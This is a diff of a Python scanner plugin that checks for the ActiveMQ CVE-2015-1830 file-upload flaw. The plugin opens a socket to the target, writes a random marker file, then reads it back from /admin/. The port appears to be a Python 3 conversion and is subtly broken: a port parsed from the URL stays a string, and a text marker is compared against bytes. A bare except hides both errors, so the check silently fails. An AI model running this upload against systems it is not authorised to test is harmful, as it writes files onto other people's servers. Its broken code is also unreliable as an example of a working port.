@@ -1,30 +1,25 @@
 # coding:utf-8
 import socket
 import time
-import urllib2
+import urllib.request as ur 
 import random
 
-def get_plugin_info():
-    plugin_info = {
-        "name": "ActiveMQ unauthenticated RCE",
-        "info": u"CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。",
-        "level": u"紧急",
-        "type": u"任意文件上传",
-        "author": u"wolf@YSRC",
-        "url": "http://cve.scap.org.cn/CVE-2015-1830.html",
-        "keyword": "title:ActiveMQ",
-        "source": 1
-    }
-    return plugin_info
-
+#CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。
 def random_str(len):
     str1 = ""
     for i in range(len):
         str1 += (random.choice("ABCDEFGH1234567890"))
     return str1
 
-def check(ip, port, timeout):
+def check(url, timeout):
     try:
+        if ":" not in url:
+            ip = url.split("/")[2]
+            if "https" in url : port = 443
+            else : port = 80
+        else :
+            ip = url.split("/")[2].split(":")[0]
+            port = url.split("/")[2].split(":")[1]
         socket.setdefaulttimeout(timeout)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
@@ -34,8 +29,8 @@ def check(ip, port, timeout):
         time.sleep(1)
         s.recv(1024)
         s.close()
-        url = 'http://' + ip + ":" + str(port) + '/admin/%s.txt'%(filename)
-        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
+        url = url.strip("/") + '/admin/%s.txt'%(filename)
+        res_html = ur.urlopen(url, timeout=timeout).read(1024)
         if 'xxscan0' in res_html:
             return u"存在任意文件上传漏洞，" + url
     except:
